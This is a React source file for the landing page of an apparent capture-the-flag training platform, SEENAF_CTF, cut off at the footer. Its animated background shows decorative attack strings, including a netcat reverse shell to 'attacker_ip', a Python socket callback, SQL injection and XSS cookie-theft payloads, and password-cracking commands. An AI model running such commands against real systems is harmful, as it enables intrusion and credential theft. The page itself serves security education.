import { useEffect, useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import { motion, useScroll, useTransform } from 'framer-motion';
import { Terminal, Flag, Trophy, Shield, ArrowRight, Zap, Code, Lock, Eye, Users, Star, Globe, Github, Twitter, Linkedin, Instagram, Youtube, Share2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { useAuth } from '@/hooks/useAuth';

export default function Index() {
  const { user, loading } = useAuth();
  const navigate = useNavigate();
  const [typedText, setTypedText] = useState('');
  const { scrollY } = useScroll();
  const y1 = useTransform(scrollY, [0, 300], [0, -50]);
  const y2 = useTransform(scrollY, [0, 300], [0, -100]);

  const fullText = 'Elite hackers. Real challenges. Ultimate glory.';

  useEffect(() => {
    if (!loading && user) {
      navigate('/challenges');
    }
  }, [user, loading, navigate]);

  useEffect(() => {
    let i = 0;
    const timer = setInterval(() => {
      if (i < fullText.length) {
        setTypedText(fullText.slice(0, i + 1));
        i++;
      } else {
        clearInterval(timer);
      }
    }, 100);
    return () => clearInterval(timer);
  }, []);

  const features = [
    {
      icon: Flag,
      title: 'Comprehensive Training',
      description: 'Master cybersecurity through 52+ hands-on challenges across 9 specialized categories including Web Security, Cryptography, Digital Forensics, and more',
      color: 'from-blue-500 to-cyan-500',
      stats: '9 Categories'
    },
    {
      icon: Terminal,
      title: 'Real-World Skills',
      description: 'Practice with industry-standard tools and techniques used by professional penetration testers and security researchers',
      color: 'from-green-500 to-emerald-500',
      stats: 'Professional Tools'
    },
    {
      icon: Shield,
      title: 'Progressive Learning',
      description: 'Start with beginner-friendly challenges and advance to expert-level scenarios that mirror real security incidents',
      color: 'from-purple-500 to-pink-500',
      stats: 'All Skill Levels'
    },
  ];

  const categories = [
    { name: 'Web Security', icon: Globe, count: 7, color: 'bg-blue-500/20 text-blue-400' },
    { name: 'Cryptography', icon: Lock, count: 7, color: 'bg-purple-500/20 text-purple-400' },
    { name: 'Forensics', icon: Eye, count: 12, color: 'bg-green-500/20 text-green-400' },
    { name: 'Reverse Engineering', icon: Code, count: 6, color: 'bg-cyan-500/20 text-cyan-400' },
    { name: 'Binary Exploitation', icon: Terminal, count: 3, color: 'bg-red-500/20 text-red-400' },
    { name: 'Network Analysis', icon: Shield, count: 6, color: 'bg-orange-500/20 text-orange-400' },
    { name: 'Steganography', icon: Star, count: 4, color: 'bg-pink-500/20 text-pink-400' },
    { name: 'OSINT', icon: Users, count: 3, color: 'bg-yellow-500/20 text-yellow-400' },
    { name: 'Miscellaneous', icon: Zap, count: 4, color: 'bg-indigo-500/20 text-indigo-400' },
  ];

  const stats = [
    { label: 'Challenge Categories', value: '9', icon: Flag },
    { label: 'Total Challenges', value: '52+', icon: Terminal },
    { label: 'Difficulty Levels', value: '3', icon: Star },
  ];

  const slogans = [
    "Break the code. Own the system.",
    "Where legends are born in binary.",
    "Hack the planet, one flag at a time.",
    "Elite minds. Impossible challenges.",
    "Your skills vs. our fortress.",
    "Think like a hacker. Act like a pro.",
    "Code is law. Hackers are judges.",
    "Welcome to the digital battlefield.",
    "Penetrate. Exploit. Conquer.",
    "The matrix has you. Break free."
  ];

  const socialLinks = [
    { 
      name: 'GitHub', 
      icon: Github, 
      url: 'https://github.com/seenaf-ctf',
      color: 'hover:text-gray-400',
      description: 'Open source challenges'
    },
    { 
      name: 'Twitter', 
      icon: Twitter, 
      url: 'https://twitter.com/seenaf_ctf',
      color: 'hover:text-blue-400',
      description: 'Latest updates & tips'
    },
    { 
      name: 'LinkedIn', 
      icon: Linkedin, 
      url: 'https://linkedin.com/company/seenaf-ctf',
      color: 'hover:text-blue-600',
      description: 'Professional network'
    },
    { 
      name: 'YouTube', 
      icon: Youtube, 
      url: 'https://youtube.com/@seenaf-ctf',
      color: 'hover:text-red-500',
      description: 'Tutorials & walkthroughs'
    },
    { 
      name: 'Instagram', 
      icon: Instagram, 
      url: 'https://instagram.com/seenaf_ctf',
      color: 'hover:text-pink-400',
      description: 'Behind the scenes'
    }
  ];

  const [currentSlogan, setCurrentSlogan] = useState(0);

  useEffect(() => {
    const sloganTimer = setInterval(() => {
      setCurrentSlogan((prev) => (prev + 1) % slogans.length);
    }, 3000);
    return () => clearInterval(sloganTimer);
  }, []);

  return (
    <div className="min-h-screen bg-background terminal-grid overflow-hidden relative">
      <div className="fixed inset-0 scanline pointer-events-none" />
      
      {/* Hero Section */}
      <section className="relative min-h-screen flex items-center justify-center px-4">
        {/* Hacking/Coding Background */}
        <div className="absolute inset-0 overflow-hidden">
          {/* Terminal Commands Falling */}
          {[
            'sudo nmap -sS target.com',
            'sqlmap -u "http://target.com/login.php"',
            'john --wordlist=rockyou.txt hash.txt',
            'hydra -l admin -P passwords.txt ssh://target',
            'msfconsole -q',
            'nc -lvp 4444',
            'python3 exploit.py',
            'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt',
            'nikto -h http://target.com',
            'burpsuite --target=http://target.com',
            'wireshark -i eth0',
            'hashcat -m 0 -a 0 hash.txt rockyou.txt',
            'steghide extract -sf image.jpg',
            'binwalk -e firmware.bin',
            'volatility -f memory.dump imageinfo',
            'strings binary | grep -i password',
            'gdb ./vulnerable_binary',
            'objdump -d binary',
            'radare2 ./malware',
            'tcpdump -i eth0 -w capture.pcap',
            'aircrack-ng -w wordlist.txt capture.cap',
            'recon-ng',
            'maltego',
            'metasploit > use exploit/multi/handler',
            'SET > Social-Engineer Toolkit',
            'beef-xss',
            'sqlmap --dbs --batch',
            'ncat --ssl target.com 443',
            'openssl s_client -connect target.com:443',
            'curl -X POST -d "user=admin&pass=123" http://target.com/login'
          ].map((cmd, i) => (
            <motion.div
              key={`cmd-${i}`}
              className="absolute text-green-400/40 font-mono text-xs select-none whitespace-nowrap"
              style={{
                textShadow: '0 0 10px currentColor',
                left: Math.random() * (window.innerWidth - 400),
              }}
              initial={{
                y: -50,
                opacity: 0,
              }}
              animate={{
                y: window.innerHeight + 50,
                opacity: [0, 0.8, 0.6, 0],
              }}
              transition={{
                duration: Math.random() * 8 + 12,
                repeat: Infinity,
                delay: Math.random() * 15,
                ease: "linear",
              }}
            >
              <span className="text-green-500/60">root@kali:~# </span>
              {cmd}
            </motion.div>
          ))}

          {/* Code Snippets */}
          {[
            'if (user.isAdmin()) { access_granted = true; }',
            'SELECT * FROM users WHERE id = 1 OR 1=1--',
            'payload = "\\x41" * 100 + "\\x42\\x43\\x44\\x45"',
            'import socket; s=socket.socket(); s.connect(("10.0.0.1",4444))',
            'document.cookie = "sessionid=" + stolen_cookie;',
            'exec("/bin/sh")',
            'buffer_overflow = "A" * 256',
            'XSS_payload = "<script>alert(document.cookie)</script>"',
            'reverse_shell = nc -e /bin/sh attacker_ip 4444',
            'hash = md5(password + salt)',
            'decrypt(ciphertext, key)',
            'steganography.extract_hidden_data(image)',
            'forensics.analyze_memory_dump()',
            'network.packet_capture.filter("tcp.port == 80")',
            'crypto.brute_force_key(encrypted_data)',
            'web.sql_injection("admin\' OR \'1\'=\'1")',
            'binary.find_buffer_overflow(input_data)',
            'malware.reverse_engineer(sample)'
          ].map((code, i) => (
            <motion.div
              key={`code-${i}`}
              className="absolute text-blue-400/30 font-mono text-xs select-none"
              style={{
                textShadow: '0 0 8px currentColor',
                left: Math.random() * (window.innerWidth - 300),
                transform: `rotate(${Math.random() * 10 - 5}deg)`,
              }}
              initial={{
                y: -30,
                opacity: 0,
                scale: 0.8,
              }}
              animate={{
                y: window.innerHeight + 30,
                opacity: [0, 0.6, 0.4, 0],
                scale: [0.8, 1, 0.9, 0.7],
              }}
              transition={{
                duration: Math.random() * 10 + 15,
                repeat: Infinity,
                delay: Math.random() * 20,
                ease: "easeInOut",
              }}
            >
              {code}
            </motion.div>
          ))}

          {/* Hex Values and Memory Addresses */}
          {[...Array(40)].map((_, i) => (
            <motion.div
              key={`hex-${i}`}
              className="absolute text-red-400/25 font-mono text-xs select-none"
              style={{
                textShadow: '0 0 6px currentColor',
              }}
              initial={{
                x: Math.random() * window.innerWidth,
                y: Math.random() * window.innerHeight,
                opacity: 0,
              }}
              animate={{
                x: Math.random() * window.innerWidth,
                y: Math.random() * window.innerHeight,
                opacity: [0, 0.5, 0],
              }}
              transition={{
                duration: Math.random() * 6 + 8,
                repeat: Infinity,
                delay: Math.random() * 10,
              }}
            >
              {`0x${Math.floor(Math.random() * 0xFFFFFF).toString(16).toUpperCase().padStart(6, '0')}`}
            </motion.div>
          ))}

          {/* Binary Data Streams */}
          {[...Array(25)].map((_, i) => (
            <motion.div
              key={`binary-${i}`}
              className="absolute text-purple-400/20 font-mono text-xs select-none"
              style={{
                textShadow: '0 0 5px currentColor',
                writingMode: Math.random() > 0.5 ? 'vertical-rl' : 'horizontal-tb',
              }}
              initial={{
                x: Math.random() * window.innerWidth,
                y: -20,
                opacity: 0,
              }}
              animate={{
                y: window.innerHeight + 20,
                opacity: [0, 0.4, 0.2, 0],
              }}
              transition={{
                duration: Math.random() * 12 + 18,
                repeat: Infinity,
                delay: Math.random() * 25,
                ease: "linear",
              }}
            >
              {Array.from({ length: 32 }, () => Math.random() > 0.5 ? '1' : '0').join('')}
            </motion.div>
          ))}

          {/* Network Packets */}
          {[
            'TCP 192.168.1.100:4444 > 10.0.0.1:80 [SYN]',
            'HTTP GET /admin/login.php',
            'DNS Query: target.com A?',
            'ICMP Echo Request',
            'SSH-2.0-OpenSSH_8.0',
            'TLS Handshake',
            'FTP Login: anonymous',
            'SMTP EHLO hacker.com'
          ].map((packet, i) => (
            <motion.div
              key={`packet-${i}`}
              className="absolute text-yellow-400/30 font-mono text-xs select-none"
              style={{
                textShadow: '0 0 8px currentColor',
                left: Math.random() * (window.innerWidth - 250),
              }}
              initial={{
                y: window.innerHeight + 20,
                opacity: 0,
              }}
              animate={{
                y: -50,
                opacity: [0, 0.6, 0.4, 0],
              }}
              transition={{
                duration: Math.random() * 6 + 10,
                repeat: Infinity,
                delay: Math.random() * 12,
                ease: "linear",
              }}
            >
              {packet}
            </motion.div>
          ))}

          {/* Glitch Effects */}
          {[...Array(15)].map((_, i) => (
            <motion.div
              key={`glitch-${i}`}
              className="absolute bg-primary/10"
              style={{
                width: Math.random() * 200 + 50,
                height: Math.random() * 2 + 1,
                left: Math.random() * window.innerWidth,
                top: Math.random() * window.innerHeight,
              }}
              animate={{
                opacity: [0, 1, 0],
                scaleX: [0, 1, 0],
              }}
              transition={{
                duration: 0.1,
                repeat: Infinity,
                repeatDelay: Math.random() * 5 + 2,
              }}
            />
          ))}
        </div>

        <motion.div style={{ y: y1 }} className="relative z-10 text-center max-w-5xl mx-auto">
          {/* Status Badge */}
          <motion.div
            initial={{ opacity: 0, scale: 0.8 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ delay: 0.1 }}
            className="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-primary/10 border border-primary/20 mb-8"
          >
            <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
            <span className="text-sm font-mono text-primary">SYSTEM ONLINE</span>
          </motion.div>

          {/* Simple Logo */}
          <motion.div
            initial={{ scale: 0, rotate: -180 }}
            animate={{ scale: 1, rotate: 0 }}
            transition={{ type: 'spring', duration: 1, delay: 0.2 }}
            className="inline-flex items-center justify-center w-24 h-24 rounded-2xl bg-primary/10 border border-primary/30 mb-8"
          >
            <Terminal className="h-12 w-12 text-primary" />
          </motion.div>

          {/* Main Title */}
          <motion.h1
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.4 }}
            className="text-6xl md:text-8xl font-mono font-black text-transparent bg-clip-text bg-gradient-to-r from-primary via-primary to-primary/70 mb-6 tracking-tight"
          >
            SEENAF_CTF
          </motion.h1>

          {/* Subtitle */}
          <motion.p
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.5 }}
            className="text-2xl md:text-3xl text-muted-foreground mb-4 font-mono font-light"
          >
            {'>'} The Ultimate Hacking SEENAF_CTF
          </motion.p>

          {/* Typed text */}
          <motion.p
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.7 }}
            className="text-lg md:text-xl text-primary/80 mb-6 font-mono min-h-[1.5rem]"
          >
            {typedText}
            <span className="animate-pulse">|</span>
          </motion.p>

          {/* Platform Highlights */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.75 }}
            className="mb-6 max-w-4xl mx-auto"
          >
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div className="p-4 rounded-xl bg-primary/5 border border-primary/20 backdrop-blur-sm text-center">
                <div className="text-2xl font-mono font-bold text-primary mb-1">Real-World</div>
                <div className="text-sm text-muted-foreground">Scenarios</div>
              </div>
              <div className="p-4 rounded-xl bg-green-500/5 border border-green-500/20 backdrop-blur-sm text-center">
                <div className="text-2xl font-mono font-bold text-green-400 mb-1">Hands-On</div>
                <div className="text-sm text-muted-foreground">Learning</div>
              </div>
              <div className="p-4 rounded-xl bg-purple-500/5 border border-purple-500/20 backdrop-blur-sm text-center">
                <div className="text-2xl font-mono font-bold text-purple-400 mb-1">Industry</div>
                <div className="text-sm text-muted-foreground">Standard</div>
              </div>
            </div>
          </motion.div>

          {/* Rotating Slogans */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.8 }}
            className="mb-12 h-8 flex items-center justify-center"
          >
            <motion.p
              key={currentSlogan}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              transition={{ duration: 0.5 }}
              className="text-base md:text-lg text-muted-foreground font-mono italic"
            >
              "{slogans[currentSlogan]}"
            </motion.p>
          </motion.div>

          {/* CTA Buttons */}
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.8 }}
            className="flex flex-col sm:flex-row items-center justify-center gap-6 mb-16"
          >
            <Link to="/auth">
              <Button size="lg" className="group bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary text-primary-foreground px-8 py-4 text-lg font-semibold rounded-xl shadow-lg hover:shadow-primary/25 transition-all duration-300">
                <Zap className="h-6 w-6 group-hover:animate-pulse mr-2" />
                Enter the SEENAF_CTF
                <ArrowRight className="h-6 w-6 group-hover:translate-x-1 transition-transform ml-2" />
              </Button>
            </Link>
            <Link to="/leaderboard">
              <Button variant="outline" size="lg" className="px-8 py-4 text-lg rounded-xl border-2 hover:bg-primary/5">
                <Trophy className="h-6 w-6 mr-2" />
                Hall of Fame
              </Button>
            </Link>
          </motion.div>

          {/* Stats */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 1 }}
            className="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-2xl mx-auto mb-12"
          >
            {stats.map((stat, index) => {
              const Icon = stat.icon;
              return (
                <div key={stat.label} className="text-center">
                  <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-primary/10 mb-3">
                    <Icon className="h-6 w-6 text-primary" />
                  </div>
                  <div className="text-2xl font-mono font-bold text-primary mb-1">{stat.value}</div>
                  <div className="text-sm text-muted-foreground">{stat.label}</div>
                </div>
              );
            })}
          </motion.div>

          {/* Social Media Links */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 1.2 }}
            className="flex flex-col items-center"
          >
            <div className="flex items-center gap-2 mb-4">
              <Share2 className="h-4 w-4 text-muted-foreground" />
              <span className="text-sm text-muted-foreground font-mono">Join the community</span>
            </div>
            <div className="flex items-center gap-6">
              {socialLinks.map((social, index) => {
                const Icon = social.icon;
                return (
                  <motion.a
                    key={social.name}
                    href={social.url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className={`group flex items-center justify-center w-12 h-12 rounded-xl bg-secondary/50 border border-border hover:border-primary/50 transition-all duration-300 ${social.color}`}
                    whileHover={{ scale: 1.1, y: -2 }}
                    whileTap={{ scale: 0.95 }}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: 1.3 + index * 0.1 }}
                  >
                    <Icon className="h-5 w-5 transition-colors duration-300" />
                  </motion.a>
                );
              })}
            </div>
            <p className="text-xs text-muted-foreground mt-3 font-mono">
              Connect with cybersecurity professionals worldwide
            </p>
          </motion.div>
        </motion.div>

        {/* Enhanced scroll indicator */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1.2 }}
          className="absolute bottom-8 left-1/2 -translate-x-1/2"
        >
          <motion.div
            animate={{ y: [0, 10, 0] }}
            transition={{ duration: 2, repeat: Infinity }}
            className="w-8 h-12 rounded-full border-2 border-primary/50 flex items-start justify-center p-2 bg-background/20 backdrop-blur-sm"
          >
            <motion.div
              animate={{ y: [0, 16, 0] }}
              transition={{ duration: 2, repeat: Infinity }}
              className="w-1.5 h-3 bg-primary rounded-full"
            />
          </motion.div>
        </motion.div>
      </section>



      {/* Challenge Categories Section */}
      <section className="relative py-24 px-4">
        <motion.div style={{ y: y2 }} className="max-w-6xl mx-auto">
          <motion.div
            initial={{ opacity: 0 }}
            whileInView={{ opacity: 1 }}
            viewport={{ once: true }}
            className="text-center mb-16"
          >
            <h2 className="text-4xl md:text-5xl font-mono font-bold text-primary mb-4">
              {'>'} CHALLENGE_CATEGORIES
            </h2>
            <p className="text-xl text-muted-foreground max-w-2xl mx-auto">
              Master the art of cybersecurity across four specialized domains
            </p>
          </motion.div>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-3 gap-6 mb-20">
            {categories.map((category, index) => {
              const Icon = category.icon;
              return (
                <motion.div
                  key={category.name}
                  initial={{ opacity: 0, y: 30 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.1 }}
                  className="group cursor-pointer"
                >
                  <div className="p-6 rounded-2xl border border-border bg-card/30 backdrop-blur-sm hover:border-primary/50 hover:bg-card/50 transition-all duration-500 hover:scale-105 hover:shadow-lg hover:shadow-primary/10">
                    <div className={`w-16 h-16 rounded-xl ${category.color} flex items-center justify-center mb-4 group-hover:scale-110 transition-transform duration-300`}>
                      <Icon className="h-8 w-8" />
                    </div>
                    <h3 className="font-mono font-bold text-lg mb-2 group-hover:text-primary transition-colors">
                      {category.name}
                    </h3>
                    <Badge variant="secondary" className="font-mono text-xs">
                      {category.count} Challenges
                    </Badge>
                  </div>
                </motion.div>
              );
            })}
          </div>

          {/* Features Grid */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
            {features.map((feature, index) => {
              const Icon = feature.icon;
              return (
                <motion.div
                  key={feature.title}
                  initial={{ opacity: 0, y: 40 }}
                  whileInView={{ opacity: 1, y: 0 }}
                  viewport={{ once: true }}
                  transition={{ delay: index * 0.2 }}
                  className="group"
                >
                  <div className="relative p-8 rounded-2xl border border-border bg-card/20 backdrop-blur-sm hover:border-primary/30 transition-all duration-500 overflow-hidden">
                    {/* Gradient overlay */}
                    <div className={`absolute inset-0 bg-gradient-to-br ${feature.color} opacity-0 group-hover:opacity-5 transition-opacity duration-500`} />
                    
                    <div className="relative z-10">
                      <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-primary/20 to-primary/5 flex items-center justify-center mb-6 group-hover:scale-110 transition-transform duration-300">
                        <Icon className="h-8 w-8 text-primary" />
                      </div>
                      
                      <div className="flex items-center justify-between mb-3">
                        <h3 className="font-mono font-bold text-xl group-hover:text-primary transition-colors">
                          {feature.title}
                        </h3>
                        <Badge variant="outline" className="font-mono text-xs">
                          {feature.stats}
                        </Badge>
                      </div>
                      
                      <p className="text-muted-foreground leading-relaxed">
                        {feature.description}
                      </p>
                    </div>
                  </div>
                </motion.div>
              );
            })}
          </div>

          {/* Interactive Skill Assessment */}
          <motion.div
            initial={{ opacity: 0, y: 30 }}
            whileInView={{ opacity: 1, y: 0 }}
            viewport={{ once: true }}
            className="mt-16 max-w-3xl mx-auto"
          >
            <div className="p-8 rounded-2xl bg-gradient-to-br from-primary/5 to-purple-500/5 border border-primary/20 backdrop-blur-sm">
              <h3 className="text-2xl font-mono font-bold text-center mb-6">
                {'>'} SKILL_ASSESSMENT
              </h3>
              <p className="text-center text-muted-foreground mb-6">
                Evaluate your cybersecurity expertise across key domains
              </p>
              
              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
                {[
                  { skill: 'Web Exploitation', level: 'Beginner', color: 'text-green-400' },
                  { skill: 'Cryptography', level: 'Intermediate', color: 'text-yellow-400' },
                  { skill: 'Binary Analysis', level: 'Advanced', color: 'text-orange-400' },
                  { skill: 'Network Security', level: 'Expert', color: 'text-red-400' }
                ].map((skill, index) => (
                  <motion.div
                    key={skill.skill}
                    whileHover={{ scale: 1.05 }}
                    className="p-4 rounded-lg bg-secondary/30 border border-border/50 text-center cursor-pointer hover:border-primary/50 transition-colors"
                  >
                    <div className="text-xs font-mono text-muted-foreground mb-1">{skill.skill}</div>
                    <div className={`text-sm font-mono font-bold ${skill.color}`}>{skill.level}</div>
                  </motion.div>
                ))}
              </div>
              
              <div className="text-center">
                <Button className="bg-gradient-to-r from-primary to-purple-500 hover:from-primary/90 hover:to-purple-500/90">
                  <Zap className="h-4 w-4 mr-2" />
                  Start Assessment
                </Button>
              </div>
            </div>
          </motion.div>
        </motion.div>
      </section>

      {/* Live Challenge Showcase */}
      <section className="relative py-16 px-4">
        <div className="max-w-6xl mx-auto">
          <motion.div
            initial={{ opacity: 0 }}
            whileInView={{ opacity: 1 }}
            viewport={{ once: true }}
            className="text-center mb-12"
          >
            <h2 className="text-3xl md:text-4xl font-mono font-bold text-primary mb-4">
              {'>'} FEATURED_CHALLENGES
            </h2>
            <p className="text-muted-foreground">Try these challenges right now</p>
          </motion.div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            {/* Live Terminal Challenge */}
            <motion.div
              initial={{ opacity: 0, x: -30 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              className="p-6 rounded-xl bg-black/60 border border-green-500/30 backdrop-blur-sm"
            >
              <div className="flex items-center gap-2 mb-4">
                <div className="w-3 h-3 bg-red-500 rounded-full"></div>
                <div className="w-3 h-3 bg-yellow-500 rounded-full"></div>
                <div className="w-3 h-3 bg-green-500 rounded-full"></div>
                <span className="ml-2 text-xs font-mono text-muted-foreground">terminal.seenaf-ctf.com</span>
              </div>
              <div className="font-mono text-sm space-y-2">
                <div className="text-green-400">root@seenaf:~# ls -la</div>
                <div className="text-white">total 42</div>
                <div className="text-white">-rw-r--r-- 1 root root 1337 Dec 14 secret.txt</div>
                <div className="text-white">-rwxr-xr-x 1 root root 2048 Dec 14 exploit.py</div>
                <div className="text-green-400">root@seenaf:~# cat secret.txt</div>
                <div className="text-red-400">Permission denied</div>
                <div className="text-green-400">root@seenaf:~# <span className="animate-pulse">█</span></div>
              </div>
              <div className="mt-4 text-center">
                <Button variant="outline" size="sm" className="border-green-500/50 text-green-400 hover:bg-green-500/10">
                  <Terminal className="h-4 w-4 mr-2" />
                  Launch Terminal
                </Button>
              </div>
            </motion.div>

            {/* Code Analysis Challenge */}
            <motion.div
              initial={{ opacity: 0, x: 30 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              className="p-6 rounded-xl bg-blue-950/30 border border-blue-500/30 backdrop-blur-sm"
            >
              <div className="flex items-center gap-2 mb-4">
                <Code className="h-4 w-4 text-blue-400" />
                <span className="text-sm font-mono text-blue-400">vulnerable.c</span>
              </div>
              <div className="font-mono text-xs space-y-1 text-blue-100">
                <div><span className="text-purple-400">#include</span> <span className="text-green-400">&lt;stdio.h&gt;</span></div>
                <div><span className="text-purple-400">#include</span> <span className="text-green-400">&lt;string.h&gt;</span></div>
                <div className="text-blue-300">
                  <span className="text-purple-400">void</span> <span className="text-yellow-400">vulnerable_function</span>(<span className="text-purple-400">char</span> *input) {'{'}
                </div>
                <div className="ml-4 text-blue-300">
                  <span className="text-purple-400">char</span> buffer[<span className="text-orange-400">64</span>];
                </div>
                <div className="ml-4 text-red-400">
                  strcpy(buffer, input); <span className="text-gray-500">// Vulnerable!</span>
                </div>
                <div className="text-blue-300">{'}'}</div>
              </div>
              <div className="mt-4 text-center">
                <Button variant="outline" size="sm" className="border-blue-500/50 text-blue-400 hover:bg-blue-500/10">
                  <Eye className="h-4 w-4 mr-2" />
                  Analyze Code
                </Button>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* CTA Section */}
      <section className="relative py-32 px-4 bg-gradient-to-t from-transparent via-primary/8 to-transparent">

        
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          whileInView={{ opacity: 1, scale: 1 }}
          viewport={{ once: true }}
          className="max-w-4xl mx-auto text-center relative z-10"
        >
          <div className="p-12 rounded-3xl bg-card/30 backdrop-blur-xl border border-primary/20 shadow-2xl shadow-primary/10">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ delay: 0.2 }}
            >
              <h2 className="text-3xl md:text-5xl font-mono font-black mb-6 text-transparent bg-clip-text bg-gradient-to-r from-primary to-primary/70">
                Ready to Join the Elite?
              </h2>
              <p className="text-xl text-muted-foreground mb-8 max-w-2xl mx-auto leading-relaxed">
                Enter the SEENAF_CTF arena and prove your cybersecurity mastery. 
                Compete with the world's best hackers and claim your place in history.
              </p>
              
              <div className="flex flex-col sm:flex-row items-center justify-center gap-6 mb-8">
                <Link to="/auth">
                  <Button size="lg" className="group bg-gradient-to-r from-primary to-primary/80 hover:from-primary/90 hover:to-primary text-primary-foreground px-10 py-5 text-xl font-bold rounded-2xl shadow-lg hover:shadow-primary/25 transition-all duration-300 hover:scale-105">
                    <Terminal className="h-6 w-6 group-hover:animate-pulse mr-3" />
                    Start Your Journey
                    <ArrowRight className="h-6 w-6 group-hover:translate-x-1 transition-transform ml-3" />
                  </Button>
                </Link>
                <Link to="/challenges">
                  <Button variant="outline" size="lg" className="px-10 py-5 text-xl rounded-2xl border-2 hover:bg-primary/5 hover:border-primary/50">
                    <Eye className="h-6 w-6 mr-3" />
                    Preview Challenges
                  </Button>
                </Link>
              </div>

              {/* Trust indicators */}
              <div className="flex items-center justify-center gap-8 text-sm text-muted-foreground mb-12">
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                  <span>Secure Platform</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse" />
                  <span>Real-time Scoring</span>
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-2 h-2 bg-purple-500 rounded-full animate-pulse" />
                  <span>24/7 Available</span>
                </div>
              </div>

              {/* Live Vulnerability Scanner Simulation */}
              <motion.div
                initial={{ opacity: 0, y: 30 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: 0.4 }}
                className="max-w-4xl mx-auto"
              >
                <div className="p-6 rounded-2xl bg-black/70 border border-red-500/30 backdrop-blur-sm">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="w-3 h-3 bg-red-500 rounded-full animate-pulse" />
                    <span className="font-mono text-red-400 text-sm">VULNERABILITY_SCANNER_v2.1.3</span>
                    <div className="ml-auto text-xs font-mono text-muted-foreground">
                      Scanning: target.seenaf-ctf.com
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                    <div className="p-3 rounded-lg bg-red-950/30 border border-red-500/20">
                      <div className="text-red-400 font-mono text-sm mb-1">CRITICAL</div>
                      <div className="text-2xl font-mono font-bold text-red-400">7</div>
                      <div className="text-xs text-muted-foreground">SQL Injection, XSS</div>
                    </div>
                    <div className="p-3 rounded-lg bg-yellow-950/30 border border-yellow-500/20">
                      <div className="text-yellow-400 font-mono text-sm mb-1">HIGH</div>
                      <div className="text-2xl font-mono font-bold text-yellow-400">12</div>
                      <div className="text-xs text-muted-foreground">CSRF, Directory Traversal</div>
                    </div>
                    <div className="p-3 rounded-lg bg-orange-950/30 border border-orange-500/20">
                      <div className="text-orange-400 font-mono text-sm mb-1">MEDIUM</div>
                      <div className="text-2xl font-mono font-bold text-orange-400">23</div>
                      <div className="text-xs text-muted-foreground">Info Disclosure</div>
                    </div>
                  </div>

                  <div className="space-y-2 font-mono text-xs mb-4">
                    <motion.div
                      animate={{ opacity: [0.5, 1, 0.5] }}
                      transition={{ duration: 2, repeat: Infinity }}
                      className="text-red-300"
                    >
                      [CRITICAL] SQL Injection detected in /login.php?id=1
                    </motion.div>
                    <motion.div
                      animate={{ opacity: [0.5, 1, 0.5] }}
                      transition={{ duration: 2, repeat: Infinity, delay: 0.5 }}
                      className="text-yellow-300"
                    >
                      [HIGH] Cross-Site Scripting (XSS) in /search.php
                    </motion.div>
                    <motion.div
                      animate={{ opacity: [0.5, 1, 0.5] }}
                      transition={{ duration: 2, repeat: Infinity, delay: 1 }}
                      className="text-orange-300"
                    >
                      [MEDIUM] Directory listing enabled on /uploads/
                    </motion.div>
                  </div>

                  <div className="text-center">
                    <Button variant="outline" size="sm" className="border-red-500/50 text-red-400 hover:bg-red-500/10">
                      <Shield className="h-4 w-4 mr-2" />
                      Exploit Vulnerabilities
                    </Button>
                  </div>
                </div>
              </motion.div>
            </motion.div>
          </div>
        </motion.div>
      </section>

      {/* Enhanced Footer */}
      <footer className="relative py-16 px-4 border-t border-border/50 bg-gradient-to-b from-background to-background/50">
